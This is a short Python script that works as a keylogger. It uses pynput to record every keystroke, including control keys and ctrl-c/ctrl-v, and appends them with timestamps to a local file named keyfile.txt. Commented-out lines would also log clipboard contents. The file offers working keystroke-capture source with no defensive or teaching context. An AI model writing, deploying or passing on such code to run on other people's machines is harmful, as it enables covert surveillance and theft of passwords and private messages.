from pynput import keyboard
from datetime import datetime
import pyperclip
import string


def stamp(fp, prev, init=False, gap=10):
    now = datetime.now()
    if init:
        fp.write(f"\n[{now}] ")
        return now
    delta = now - prev
    if delta.seconds >= gap:
        fp.write(f"\n[{now}] ")
        return now
    return prev

def get_clipboard_contents():
    return pyperclip.paste()

def keyPressed(key):
    global last, new
    with open("keyfile.txt", 'a') as logKey:
        last = stamp(logKey, last, new, gap=60)
        new = False
        try:
            char = key.char
            if char in string.printable:
                print("printable")
                logKey.write(char)
            else:
                char = char.encode('utf-8')
                # print(str(key), char.encode('utf-8'))
                if char == b'\x03':
                    logKey.write("<ctrl-c>")
                    # clipboard_contents = get_clipboard_contents()
                    # logKey.write(f"[Clipboard: {clipboard_contents}]")
                elif char == b'\x16':
                    logKey.write("<ctrl-v>")

        except Exception as ex:
            print(ex)
            if str(key) == "Key.enter":
                logKey.write("\n" + " "*29)
            elif str(key) == "Key.space":
                logKey.write(" ")
            elif "Key.ctrl_" in str(key):
                pass
            elif str(key) == "Key.backspace":
                logKey.seek(logKey.tell()-1)
                # logKey.write(" ")
                # logKey.seek(logKey.tell()-1)
            else:
                 logKey.write(f"<{str(key)}>")


if __name__ == "__main__":
    last = None
    new = True
    with keyboard.Listener(on_press=keyPressed) as l:
        l.join()
    # clipboard_contents = get_clipboard_contents()
    # print(clipboard_contents)
    # listener = keyboard.Listener(on_press=keyPressed)
    # listener.start()
    # input()